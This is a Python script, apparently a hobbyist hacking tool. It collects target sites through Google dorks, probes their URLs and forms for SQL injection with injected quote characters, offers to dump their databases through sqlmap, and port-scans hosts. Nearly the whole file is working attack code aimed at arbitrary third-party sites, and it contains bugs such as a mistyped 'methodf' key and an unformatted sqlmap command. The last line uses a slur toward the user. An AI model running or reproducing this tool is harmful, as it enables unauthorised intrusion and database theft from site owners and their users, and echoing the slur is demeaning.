from googlesearch import search
import time, sys, os
from colorama import Fore
import argparse
import webbrowser
import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pprint
from socket import *

#Slow print for things
def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.1)

#Ping needs
startTime = time.time()

#Crawling needs
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

  
  
      
#For loading screens ofc
delay = 0.2

#Clear screen since im too lazy to type out os.system('clear')
def cls():
  os.system('clear')

#Loading function

def ping():
  target = args.ping
  t_IP = gethostbyname(target)
  print ('Starting scan on host: ', t_IP)
  for i in range(50, 500):
     s = socket(AF_INET, SOCK_STREAM)
     conn = s.connect_ex((t_IP, i))
     if(conn == 0) :
       print ('Port %d: OPEN' % (i,))
       s.close()
       print('Time taken:', time.time() - startTime)

def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(s.get(url).content, "html.parser")
    return soup.find_all("form")


def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    # get the form action (target url)
    try:
        action = form.attrs.get("action").lower()
    except:
        action = None
    # get the form method (POST, GET, etc.)
    method = form.attrs.get("method", "get").lower()
    # get all the input details such as type and name
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        inputs.append({"type": input_type, "name": input_name, "value": input_value})
    # put everything to the resulting dictionary
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details


def is_vulnerable(response):
    """A simple boolean function that determines whether a page 
    is SQL Injection vulnerable from its `response`"""
    errors = {
        # MySQL
        "you have an error in your sql syntax;",
        "warning: mysql",
        # SQL Server
        "unclosed quotation mark after the character string",
        # Oracle
        "quoted string not properly terminated",
    }
    for error in errors:
        # if you find one of these errors, return True
        if error in response.content.decode().lower():
            return True
    # no error detected
    return False


def scan_sql_injection(url):
    # test on URL
    for c in "\"'":
        # add quote/double quote character to the URL
        new_url = f"{url}{c}"
        print("[!] Trying", new_url)
        # make the HTTP request
        res = s.get(new_url)
        if is_vulnerable(res):
            # SQL Injection detected on the URL itself, 
            # no need to preceed for extracting forms and submitting them
            print("[+] SQL Injection vulnerability detected, link:", new_url)
            return
    # test on HTML forms
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    for form in forms:
        form_details = get_form_details(form)
        for c in "\"'":
            # the data body we want to submit
            data = {}
            for input_tag in form_details["inputs"]:
                if input_tag["value"] or input_tag["type"] == "hidden":
                    # any input form that has some value or hidden,
                    # just use it in the form body
                    try:
                        data[input_tag["name"]] = input_tag["value"] + c
                    except:
                        pass
                elif input_tag["type"] != "submit":
                    # all others except submit, use some junk data with special character
                    data[input_tag["name"]] = f"test{c}"
            # join the url with the action (form request URL)
            url = urljoin(url, form_details["action"])
            if form_details["method"] == "post":
                res = s.post(url, data=data)
            elif form_details["methodf"] == "get":
                res = s.get(url, params=data)
            # test whether the resulting page is vulnerable
            if is_vulnerable(res):
                print("[+] SQL Injection vulnerability detected, link:", url)
                print("[+] Form:")
                pprint(form_details)
                break   

  
#Text User Interface
def tui():
  os.system('clear')
  print("""                ,-,
                                                             _.-=;~ /_
                                                          _-~   '     ;.
                                                      _.-~     '   .-~-~`-._
                                                _.--~~:.             --.____88
                              ____.........--~~~. .' .  .        _..-------~~
                     _..--~~~~               .' .'             ,'
                 _.-~                        .       .     ` ,'
               .'                                    :.    ./
             .:     ,/          `                   ::.   ,'
           .:'     ,(            ;.                ::. ,-'
          .'     ./'.`.     . . /:::._______.... _/:.o/
         /     ./'. . .)  . _.,'               `88;?88|
       ,'  . .,/'._,-~ /_.o8P'                  88P ?8b
    _,'' . .,/',-~    d888P'                    88'  88|
 _.'~  . .,:oP'        ?88b              _..--- 88.--'8b.--..__
:     ...' 88o __,------.88o ...__..._.=~- .    `~~   `~~      ~-._      _.
`.;;;:='    ~~            ~~~                ~-    -       -   -""")
  print("""
  --------------------------
  | [1] Use dork once      |
  | [2] Use multiple dorks |
  --------------------------""")
  while True:
    option = input("_> ")
    if option =='1':
      query = input("Enter dork _> ")
      while True:
        yesno = input("Do you want to open the urls?\n")
        if yesno =='yes':
          for j in search(query):
            webbrowser.open(j)
        else:
          break
        for j in search(query):
          print(Fore.GREEN + '{}'.format(j))
          print(Fore.LIGHTYELLOW_EX + "---------------------")
    elif option =='2':
      print("This is the exact same as --d because im lazy.")
      file = input("Enter filename _> ")
      print_slow(f"Using {file} to attack")
      with open(file, 'r') as s:
        query = s.read()
        for j in search(query):
          print(Fore.GREEN + "{}".format(j))
          print(Fore.LIGHTYELLOW_EX + "-------------------")


#Small and lightweight searcher
def dictionary():
  with open('targets.txt', 'r') as s:
    query = s.read()
    for j in search(query):
      print(Fore.GREEN + '{}'.format(j))
      print(Fore.LIGHTYELLOW_EX + "--------------------------------")
      if args.crawl:
        print("Starting to crawl!")
        scan_sql_injection(j)

    yur = input("Do you want to dump the database via sqlmap? ")
    if yur =='yes':
        os.system('sqlmap {j} --dump --dbs')
    else:
        sys.exit('Bye')
    
    
    
#Arguments
parser = argparse.ArgumentParser()
#Take from txt
parser.add_argument('-d', '--dictionary', action='store_true', 
help="Takes infomation from 'targets.txt' and searches them!")

#Opens tui version (buggy)
parser.add_argument('-i', '--interact',
action='store_true',
help="Runs the tui version of this tool! ")


#Crawls website for sqli vulnerbilite
parser.add_argument('-c', '--crawl',
action='store_true',
help='Run the crawler to check for sqli')

#Pings the select host.
parser.add_argument('-p', '--ping',
help='Pings the select host to see if it is alive')

args = parser.parse_args()
#Detect correct args
if args.dictionary:
    cls()
    print("""                ,-,
                                                             _.-=;~ /_
                                                          _-~   '     ;.
                                                      _.-~     '   .-~-~`-._
                                                _.--~~:.             --.____88
                              ____.........--~~~. .' .  .        _..-------~~
                     _..--~~~~               .' .'             ,'
                 _.-~                        .       .     ` ,'
               .'                                    :.    ./
             .:     ,/          `                   ::.   ,'
           .:'     ,(            ;.                ::. ,-'
          .'     ./'.`.     . . /:::._______.... _/:.o/
         /     ./'. . .)  . _.,'               `88;?88|
       ,'  . .,/'._,-~ /_.o8P'                  88P ?8b
    _,'' . .,/',-~    d888P'                    88'  88|
 _.'~  . .,:oP'        ?88b              _..--- 88.--'8b.--..__
:     ...' 88o __,------.88o ...__..._.=~- .    `~~   `~~      ~-._      _.
`.;;;:='    ~~            ~~~                ~-    -       -   -""")
    dictionary()

if args.interact:
  cls()
  print("""                ,-,
                                                             _.-=;~ /_
                                                          _-~   '     ;.
                                                      _.-~     '   .-~-~`-._
                                                _.--~~:.             --.____88
                              ____.........--~~~. .' .  .        _..-------~~
                     _..--~~~~               .' .'             ,'
                 _.-~                        .       .     ` ,'
               .'                                    :.    ./
             .:     ,/          `                   ::.   ,'
           .:'     ,(            ;.                ::. ,-'
          .'     ./'.`.     . . /:::._______.... _/:.o/
         /     ./'. . .)  . _.,'               `88;?88|
       ,'  . .,/'._,-~ /_.o8P'                  88P ?8b
    _,'' . .,/',-~    d888P'                    88'  88|
 _.'~  . .,:oP'        ?88b              _..--- 88.--'8b.--..__
:     ...' 88o __,------.88o ...__..._.=~- .    `~~   `~~      ~-._     _.
`.;;;:='    ~~            ~~~                ~-    -       -   -""")
  tui()

if args.ping:
  cls()
  ping()
print("Needs arguments you retard")
